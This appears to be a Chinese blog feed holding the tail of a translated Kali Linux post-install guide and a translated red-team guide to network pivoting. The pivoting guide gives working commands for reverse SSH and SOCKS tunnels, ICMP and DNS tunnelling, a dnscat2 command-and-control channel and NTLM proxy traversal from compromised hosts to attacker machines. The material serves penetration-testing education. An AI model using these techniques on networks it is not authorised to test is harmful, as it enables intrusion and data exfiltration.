<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget -O- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">--2019-02-18 19:28:23--  https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc</span><br><span class="line">Resolving deb.torproject.org (deb.torproject.org)... 138.201.14.197</span><br><span class="line">Connecting to deb.torproject.org (deb.torproject.org)|138.201.14.197|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 19665 (19K) [text/plain]</span><br><span class="line">Saving to: ‘STDOUT’</span><br><span class="line"></span><br><span class="line">-                                              100%[=================================================================================================&gt;]  19.20K  47.5KB/s    <span class="keyword">in</span> 0.4s</span><br><span class="line"></span><br><span class="line">2019-02-18 19:28:25 (47.5 KB/s) - written to stdout [19665/19665]</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>将签名密钥添加到密钥环后，您将看到“OK”输出。接下来，使用以下 apt-get 命令更新 APT。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">Hit:1 http://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid InRelease</span><br><span class="line">Get:2 https://deb.torproject.org/torproject.org stretch InRelease [4,965 B]</span><br><span class="line">Get:4 https://deb.torproject.org/torproject.org stretch/main Sources [1,169 B]</span><br><span class="line">Get:5 https://deb.torproject.org/torproject.org stretch/main amd64 Packages [2,400 B]</span><br><span class="line">Hit:3 http://archive-3.kali.org/kali kali-rolling InRelease</span><br><span class="line">Fetched 8,534 B <span class="keyword">in</span> 8s (1,091 B/s)</span><br><span class="line">Reading package lists... Done</span><br></pre></td></tr></table></figure>

<p>使用以下命令安装 Tor，你就完成了。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install tor deb.torproject.org-keyring</span><br><span class="line"></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">Suggested packages:</span><br><span class="line">  mixmaster torbrowser-launcher socat tor-arm apparmor-utils obfs4proxy</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  deb.torproject.org-keyring</span><br><span class="line">The following packages will be upgraded:</span><br><span class="line">  tor</span><br></pre></td></tr></table></figure>

<h2 id="7、使用-Syncthing-配置文件共享"><a href="#7、使用-Syncthing-配置文件共享" class="headerlink" title="7、使用 Syncthing 配置文件共享"></a>7、使用 Syncthing 配置文件共享</h2><p>由 <a href="https://twitter.com/jakobborg">Jakob Borg</a> 创建的 <a href="https://github.com/syncthing/syncthing">Syncthing</a> 是一种<a href="https://github.com/syncthing/syncthing/releases/">跨平台</a>，私有，轻量级文件同步（Dropbox）替代方案。作为渗透测试人员，在 <a href="https://null-byte.wonderhowto.com/how-to/white-hats-guide-choosing-virtual-private-server-0183135/">VPS</a> 和本地 Kali 机器之间传输按键日志，屏幕截图，网络摄像头录像和<a href="https://null-byte.wonderhowto.com/how-to/hacking-windows-10-capture-exfiltrate-screenshots-remotely-0183646/#jump-step4">敏感的战利品文件</a>可能是一项令人沮丧的任务。Syncthing 使安全的文件共享完全无痛。</p>
<p>我在前一篇文章中介绍了 <a href="https://null-byte.wonderhowto.com/how-to/securely-sync-files-between-two-machines-using-syncthing-0185999/">Syncthing 的安装和配置</a>。读者应参考该详细的分步指南。</p>
<h2 id="8、安装代码编辑器"><a href="#8、安装代码编辑器" class="headerlink" title="8、安装代码编辑器"></a>8、安装代码编辑器</h2><p><a href="https://atom.io/">Atom</a> 是一个免费的，开源的，功能丰富且高度可定制的文本编辑器。其功能包括实时协作共享代码，直观的编码自动补全功能，以及<a href="https://atom.io/packages">安装软件包</a>的能力，这些都进一步增强了 Atom 的多功能性。其他值得注意的文本编辑包括 <a href="https://wiki.geany.org/doku.php">Geany</a> 和 <a href="https://wiki.gnome.org/Apps/Gedit">Gedit</a>。</p>
<p>要安装 Atom，请访问他们的网站并下载最新的 <a href="https://atom.io/download/deb">Debian 安装程序</a>。接下来，使用下面的 apt-get 命令打开终端并安装所需的依赖项。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install gvfs gvfs-common gvfs-daemons gvfs-libs gconf-service gconf2 gconf2-common gvfs-bin psmisc</span><br><span class="line"></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">Correcting dependencies... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">   gconf-service (3.2.6-4.1)</span><br><span class="line">   gconf2 (3.2.6-4.1)</span><br><span class="line">   gconf2-common (3.2.6-4.1)</span><br><span class="line">   gvfs-bin (1.36.2-1)</span><br><span class="line">   libgconf-2-4 (3.2.6-4.1)</span><br><span class="line">   psmisc (23.1-1+b1)</span><br><span class="line">The following packages will be upgraded:</span><br><span class="line">   gvfs (1.36.1-1 =&gt; 1.36.2-1)</span><br><span class="line">   gvfs-common (1.36.1-1 =&gt; 1.36.2-1)</span><br><span class="line">   gvfs-daemons (1.36.1-1 =&gt; 1.36.2-1)</span><br><span class="line">   gvfs-libs (1.36.1-1 =&gt; 1.36.2-1)</span><br><span class="line">4 upgraded, 6 newly installed, 0 to remove and 462 not upgraded.</span><br><span class="line">1 not fully installed or removed.</span><br><span class="line">Need to get 3,317 kB of archives.</span><br><span class="line">After this operation, 8,909 kB of additional disk space will be used.</span><br><span class="line">Do you want to <span class="built_in">continue</span>? [Y/n] y</span><br></pre></td></tr></table></figure>

<p>最后，使用命令行包管理器 <strong>dpkg</strong> 和 install（**-i**）参数。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dpkg -i ~/Downloads/atom-amd64.deb</span><br><span class="line"></span><br><span class="line">(Reading database ... 191882 files and directories currently installed.)</span><br><span class="line">Preparing to unpack atom-amd64.deb ...</span><br><span class="line">Unpacking atom (1.29.0) over (1.29.0) ...</span><br><span class="line">Setting up atom (1.29.0) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> desktop-file-utils (0.23-3) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> mime-support (3.60) ...</span><br></pre></td></tr></table></figure>

<p>完成后，Atom 将显示在“应用程序”菜单中。</p>
<p><img src="https://img.wonderhowto.com/img/original/05/68/63669459068404/0/636694590684040568.jpg" alt="Atom"></p>
<h2 id="9、克隆橡皮鸭（Rubber-Ducky）编码器"><a href="#9、克隆橡皮鸭（Rubber-Ducky）编码器" class="headerlink" title="9、克隆橡皮鸭（Rubber Ducky）编码器"></a>9、克隆橡皮鸭（Rubber Ducky）编码器</h2><p>USB 橡皮鸭是臭名昭著的按键注入工具。利用 <a href="https://ducktoolkit.com/">DuckToolKit 网站</a>可以很容易地创建 <a href="https://null-byte.wonderhowto.com/how-to/use-usb-rubber-ducky-disable-antivirus-software-install-ransomware-0180418/#jump-step2">ducky payloads</a>，但作为一个渗透测试人员，与随机网站共享客户信息是不安全的。将有效载荷内容上载到第三方网站可能很危险。</p>
<p>相反，我们可以使用 <strong>Git</strong> 克隆 USB 橡皮鸭<a href="https://github.com/hak5darren/USB-Rubber-Ducky">存储库</a>并在本地编码有效载荷。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hak5darren/USB-Rubber-Ducky</span><br><span class="line"></span><br><span class="line">Cloning into <span class="string">&#x27;USB-Rubber-Ducky&#x27;</span>...</span><br><span class="line">remote: Counting objects: 1657, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 1657 (delta 0), reused 0 (delta 0), pack-reused 1657</span><br><span class="line">Receiving objects: 100% (1657/1657), 31.88 MiB | 162.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (745/745), <span class="keyword">done</span>.</span><br><span class="line">Checking out files: 100% (1509/1509), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure>

<p>然后，将当前目录更改（<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-2-creating-directories-files-0147234/">cd</a>）为 <code>USB-Rubber-Ducky/Encoder/</code> 目录，并使用以下 <strong>java</strong> 命令开始编码没有第三方网站的 <a href="https://www.hak5.org/gear/duck/writing-your-first-usb-rubber-ducky-payload">ducky payloads</a>。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> USB-Rubber-Ducky/Encoder/</span><br><span class="line">java -jar encoder.jar -i input_payload.txt -o inject.bin</span><br></pre></td></tr></table></figure>

<h2 id="10、更改-SSH-密钥和默认密码"><a href="#10、更改-SSH-密钥和默认密码" class="headerlink" title="10、更改 SSH 密钥和默认密码"></a>10、更改 SSH 密钥和默认密码</h2><p>每个 Kali Linux 安装的默认密码都是相同的（toor），这使得自动化攻击非常容易。此外，当你通过 SSH 控制树莓派之类的东西时，默认的 SSH 密钥可以允许攻击者拦截你的通信。</p>
<p>要更改 SSH 密钥，请首先切换目录。执行以下两个命令将重置 SSH 密钥的默认值。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/ssh/</span><br><span class="line">dpkg-reconfigure openssh-server</span><br><span class="line"></span><br><span class="line">rescue-ssh.target is a disabled or a static unit, not starting it.</span><br></pre></td></tr></table></figure>

<p>现在，对于你的 Kali 系统密码，输入 <strong>passwd root</strong>，然后输入你的新密码。然后，重新输入以确认。如果你未以 root 用户身份登录，则可能会在执行此操作之前询问你当前的密码。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">passwd root</span><br><span class="line"></span><br><span class="line">Enter new UNIX password:</span><br><span class="line">Retype new UNIX password:</span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure>

<h2 id="安装-Kali-后你做的第一件事是什么？"><a href="#安装-Kali-后你做的第一件事是什么？" class="headerlink" title="安装 Kali 后你做的第一件事是什么？"></a>安装 Kali 后你做的第一件事是什么？</h2><p>我们都有不同程度的兴趣，技能和经验水平。这使得编写完整的安装后步骤列表变得棘手。我错过了任何关键步骤吗？你如何个性化和定制新安装的Kali？请务必在下面发表评论。</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>一个红队成员的跳板（pivoting）指南</title>
    <url>/2017/12/10/pivoting-guide/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a> ，正文如下：</p>
<hr>
<p>渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是 red team/pentest 参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。</p>
<span id="more"></span>

<h2 id="以公有-IP-为目标"><a href="#以公有-IP-为目标" class="headerlink" title="以公有 IP 为目标"></a>以公有 IP 为目标</h2><p>一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的 RCE 漏洞。你上传了一个 shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。</p>
<h3 id="SSH-端口转发"><a href="#SSH-端口转发" class="headerlink" title="SSH 端口转发"></a>SSH 端口转发</h3><p>设法找到在主机上运行的 SSH 服务的凭据？很好！连接到主机，如下所示：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh username@host -D 1080</span><br></pre></td></tr></table></figure>

<p>这将在攻击者一侧产生一个 socks 服务器（ssh 客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机 192.168.1.1 的内部网络中的 SMB 共享。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh username@host -L 445:192.168.1.1:445</span><br></pre></td></tr></table></figure>

<p>这样，端口 445 就会被打开在攻击者一侧。请注意，要绑定特权端口（例如 445），你将需要在你的计算机上拥有 root 权限。</p>
<h4 id="通过-SSH-的-VPN"><a href="#通过-SSH-的-VPN" class="headerlink" title="通过 SSH 的 VPN"></a>通过 SSH 的 VPN</h4><p>由于 openssh 4.3 版本，可以通过已建立的 ssh 通道来传输第 3 层网络流量。这比典型的 tcp 隧道有优势，因为你在控制 ip 流量。因此，例如，你可以使用 nmap 执行 SYN 扫描，并直接使用你的工具，而无需使用 <code>proxychains</code> 或其他代理工具。它是通过在客户端和服务器端创建 tun 设备并通过 ssh 连接在它们之间传输数据完成的。这很简单，但是由于 tun 设备的创建是一个特权操作，所以在两台机器上都需要 root。这些行应该出现在 <code>/etc/ssh/sshd_config</code> 文件（服务器端）中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PermitRootLogin yes</span><br><span class="line">PermitTunnel yes</span><br></pre></td></tr></table></figure>

<p>客户端上的以下命令将在客户端和服务器上创建一对 tun 设备：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh username@server -w any:any</span><br></pre></td></tr></table></figure>

<p>标志 <code>-w</code> 接受用冒号分隔的每一侧的 tun 设备的数量。可以显式设置 —— <code>-w 0:0</code>，也可以使用 <code>-w any:any</code> 语法来获取下一个可用的 tun 设备。<br>tun 设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0</span><br></pre></td></tr></table></figure>

<p>服务器端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0</span><br></pre></td></tr></table></figure>

<p>在服务器上启用 IP 转发和 NAT：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure>

<p>现在，你可以将对等主机 <code>1.1.1.1</code> 设置为你的默认网关，或通过它路由到特定的主机/网络：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">route add -net 10.0.0.0/16 gw 1.1.1.1</span><br></pre></td></tr></table></figure>

<p>在这个例子中，服务器的外部网络接口是 <code>eth0</code>，两端新创建的 tun 设备是 <code>tun0</code>。</p>
<h3 id="3proxy"><a href="#3proxy" class="headerlink" title="3proxy"></a>3proxy</h3><p>在这里获取 - <a href="https://github.com/z3APA3A/3proxy/releases">https://github.com/z3APA3A/3proxy/releases</a> 。这个工具适用于多个平台。有预编译的 Windows 二进制文件。至于 Linux，你将需要自己编译它，这是一个很简单的事，只是 <code>./configure &amp;&amp; make</code> :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为 socks 代理或端口转发。<br>这个工具从配置文件中获得所有选项。运行它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">3proxy.exe config_file</span><br></pre></td></tr></table></figure>

<p>或者如果你在 Linux 系统上：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./3proxy config_file</span><br></pre></td></tr></table></figure>

<p>要在端口 1080 上运行 3proxy 作为 socks5 代理，请在 config 中放置以下行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socks -p1080</span><br></pre></td></tr></table></figure>

<p>现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于 IP 的访问控制规则。去检查完整的手册在这里 - <a href="https://3proxy.ru/howtoe.asp">https://3proxy.ru/howtoe.asp</a> 。要对特定端口进行隧道使用，请用以下语法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt;</span><br></pre></td></tr></table></figure>

<h2 id="NAT-场景"><a href="#NAT-场景" class="headerlink" title="NAT 场景"></a>NAT 场景</h2><p>这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。</p>
<h3 id="SSH-反向端口转发-w-3proxy"><a href="#SSH-反向端口转发-w-3proxy" class="headerlink" title="SSH 反向端口转发/w 3proxy"></a>SSH 反向端口转发/w 3proxy</h3><p>这个跳板设置看起来像这样：<br>在目标服务器上使用以下配置运行 3proxy 服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socks -p31337</span><br></pre></td></tr></table></figure>

<p>在接收方（攻击者的机器）上创建一个单独的用户。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adduser sshproxy</span><br></pre></td></tr></table></figure>

<p>这个用户必须是低权限的，不应该有 shell 权限。毕竟，你不想被反向渗透，你呢？:)编辑 /etc/passwd 并将 shell 切换到 /bin/false。它应该是这样的：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/<span class="literal">false</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>现在使用 <code>-R</code> 标志连接到新创建的用户的服务器。Linux 系统：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh sshproxy@your_server -R 31337:127.0.0.1:31337</span><br></pre></td></tr></table></figure>

<p>对于 Windows，你将需要首先上传 <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">plink.exe</a>。这是一个 putty 的控制台版本。运行它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337</span><br></pre></td></tr></table></figure>

<p><code>-R</code> 标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行 3proxy socks 服务（受感染的机器）并通过 ssh<code>-R</code> 标志访问攻击者主机上的这个端口。</p>
<h3 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h3><p>这是我最喜欢穿越 NAT 连接的方法。<a href="https://github.com/artkond/rpivot">Rpivot</a> 是一个反向 socks 代理工具，可以让你通过 socks 代理隧道化流量。它连接回你的机器，并绑定一个 socks 代理。它的工作方式与 <code>ssh -D</code> 很像，但方向相反。服务器端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python client.py --server-ip &lt;ip&gt; --server-port 9999</span><br></pre></td></tr></table></figure>

<p>结果，一个 socks4 代理服务将被绑定在服务器端的 1080 端口。</p>
<h2 id="从内部网络泄漏"><a href="#从内部网络泄漏" class="headerlink" title="从内部网络泄漏"></a>从内部网络泄漏</h2><p>这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。</p>
<h3 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h3><p>如果 icmp 流量被允许到外部网络，那么很可能你可以建立一个 icmp 隧道。缺点是你需要在目标系统上拥有 root/administrator 权限，因为有必要使用原始套接字。检查这个工具 - <a href="http://code.gerade.org/hans/">http://code.gerade.org/hans/</a> 。我个人从来没有尝试过在 Windows 上运行它。它在 Linux 上非常有效。服务器端命令（攻击者的机器）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./hans -v -f -s 1.1.1.1 -p P@ssw0rd</span><br></pre></td></tr></table></figure>

<p><code>-v</code> 标志是详细的，<code>-f</code> 标志在前台运行，<code>-s</code> 标志的值是服务器在新创建的 tun 接口上的 ip。<br>客户端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v</span><br></pre></td></tr></table></figure>

<p>连接成功后，客户端应该可以直接在 1.1.1.100 处看到：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ping 1.1.1.100</span></span><br><span class="line">PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.</span><br><span class="line">64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms</span><br></pre></td></tr></table></figure>

<p>现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。</p>
<h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。<a href="http://dev.kryo.se/iodine/wiki/HowtoSetup">这个手册</a>可能会帮助你设置你的名称服务器。</p>
<h4 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h4><p>如果发生这种情况，并且在服务器上获得了 root 访问权限，你可以试试 <a href="http://code.kryo.se/iodine/">iodine</a>。它几乎像 hans icmp 隧道工具一样工作 - 它创建了一对 tun 适配器，并将它们之间的数据作为 DNS 查询进行隧道传输。服务器端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iodine -f -P P@ssw0rd tunneldomain.com -r</span><br></pre></td></tr></table></figure>

<p>连接成功将在地址 1.1.1.2 处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的 ssh 连接：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</span><br></pre></td></tr></table></figure>

<h4 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h4><p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a> 通过递归 DNS 查询建立 C＆C 通道。这个工具不需要 root/administrator 权限（在 windows 和 linux 上都可以）。它也支持端口转发。服务器端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ruby ./dnscat2.rb tunneldomain.com</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./dnscat2 tunneldomain.com</span><br></pre></td></tr></table></figure>

<p>在收到服务器端的连接后，可以使用 <code>windows</code> 命令查看活动会话：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dnscat2&gt; windows</span><br><span class="line">0 :: main [active]</span><br><span class="line">  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]</span><br><span class="line">  1 :: <span class="built_in">command</span> session (debian)</span><br><span class="line">  2 :: sh (debian) [*]</span><br></pre></td></tr></table></figure>

<p>要启动端口转发，请选择带有 <code>session -i &lt;num&gt;</code> 的命令会话：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dnscat2&gt; session -i 1</span><br><span class="line">New window created: 1</span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">This is a <span class="built_in">command</span> session!</span><br><span class="line"></span><br><span class="line">That means you can enter a dnscat2 <span class="built_in">command</span> such as</span><br><span class="line"><span class="string">&#x27;ping&#x27;</span>! For a full list of clients, try <span class="string">&#x27;help&#x27;</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> session (debian) 1&gt;</span><br></pre></td></tr></table></figure>

<p>使用 <code>listen [lhost:]lport rhost:rport</code> 命令转发一个端口：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80</span><br></pre></td></tr></table></figure>

<p>这将绑定攻击者机器上的 8080 端口，并将所有连接转发到 10.0.0.20:80。</p>
<h3 id="公司的-HTTP-代理作为一种出路"><a href="#公司的-HTTP-代理作为一种出路" class="headerlink" title="公司的 HTTP 代理作为一种出路"></a>公司的 HTTP 代理作为一种出路</h3><p>HTTP 代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;）</p>
<h4 id="使用-Rpivot"><a href="#使用-Rpivot" class="headerlink" title="使用 Rpivot"></a>使用 Rpivot</h4><p>我已经在 NAT 穿越部分提到了这个工具。它还支持通过 NTLM HTTP 代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\</span><br><span class="line">--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</span><br><span class="line">--username Alice --password P@ssw0rd</span><br></pre></td></tr></table></figure>

<p>或者如果你有 LM:NT 哈希而不是密码：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python client.py --server-ip &lt;rpivot_server_ip&gt;\</span><br><span class="line">--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</span><br><span class="line">--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45</span><br></pre></td></tr></table></figure>

<h4 id="Cntlm"><a href="#Cntlm" class="headerlink" title="Cntlm"></a>Cntlm</h4><p><a href="http://cntlm.sourceforge.net/">Cntlm</a> 是通过 NTLM 代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如 putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口 443（这个端口是最有可能被允许通过代理的）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Username Alice</span><br><span class="line">Password P@ssw0rd</span><br><span class="line">Domain CONTOSO.COM</span><br><span class="line">Proxy 10.0.0.10:8080</span><br><span class="line">Tunnel 2222:&lt;attackers_machine&gt;:443</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cntlm.exe -c config.conf</span><br></pre></td></tr></table></figure>

<p>或者如果你在 Linux 上：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./cntlm -c config.conf</span><br></pre></td></tr></table></figure>

<p>现在，假设你已经在远程主机的 443 端口上运行 ssh，你可以启动 ssh 客户端（openssh/putty）并连接到本地端口 2222 来访问外部机器。</p>
<h4 id="通过-HTTP-代理的-OpenVpn"><a href="#通过-HTTP-代理的-OpenVpn" class="headerlink" title="通过 HTTP 代理的 OpenVpn"></a>通过 HTTP 代理的 OpenVpn</h4><p><a href="https://openvpn.net/index.php/open-source/documentation/howto.html">OpenVpn</a> 是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过 NTLM 代理的隧道 TCP 连接。将此行添加到你的配置文件中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm</span><br></pre></td></tr></table></figure>

<p>凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要 root。</p>
<h2 id="利用带有-proxychains-的-SOCKS"><a href="#利用带有-proxychains-的-SOCKS" class="headerlink" title="利用带有 proxychains 的 SOCKS"></a>利用带有 proxychains 的 SOCKS</h2><p>如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用 <code>proxychains</code> 来强制你的程序通过 socks 代理。编辑 /etc/proxychains.conf 中的代理服务器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># add proxy here ...</span></span><br><span class="line"><span class="comment"># meanwile</span></span><br><span class="line"><span class="comment"># defaults set to &quot;tor&quot;</span></span><br><span class="line">socks4  127.0.0.1 3128</span><br></pre></td></tr></table></figure>

<p>准备好了，只需在你最喜欢的 pwn 工具上添加 <code>proxychains</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxychains program_name</span><br></pre></td></tr></table></figure>

<p>与 proxychains 一起使用的 impacket&#39;s psexec.py：</p>
<p><img src="/images/pivoting1.png" alt="proxychains psexec"></p>
<h2 id="DNS-与-proxychains"><a href="#DNS-与-proxychains" class="headerlink" title="DNS 与 proxychains"></a>DNS 与 proxychains</h2><p>Proxychains 在解析主机名时不遵循 socks RFC。它拦截 <code>gethostbyname</code> libc 调用并通过 socks 代理隧道化 tcp DNS 请求。事情是，DNS 服务器硬编码到 <code>4.2.2.2</code>。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试 Windows 环境，将名称服务器更改为域控制器。该设置位于 <code>/usr/lib/proxychains3/proxyresolv</code>：</p>
